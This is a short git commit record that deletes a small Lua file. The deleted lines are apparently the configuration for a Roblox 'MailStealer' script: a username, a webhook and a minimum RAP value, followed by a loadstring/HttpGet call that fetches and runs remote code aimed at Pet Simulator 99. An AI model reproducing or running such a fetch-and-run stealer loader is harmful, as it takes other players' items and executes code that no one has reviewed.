a8afd985f61c6d5f51e6c916fbb3c9bdcff1b507
Evelynn <folder.is.back@gmail.com>
2025-06-13 17:55:48 +0200

    Delete kyutjyhrdgfs.lua

--- kyutjyhrdgfs.lua
+++
@@ -1,6 +0,0 @@
-Username = '1'
-Username2 = '1'
-Webhook = 'hi'
-MinimumRAP = 1
-
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Ev3ly-nn/MailStealer/refs/heads/main/Protected_PetSimulator99'))()
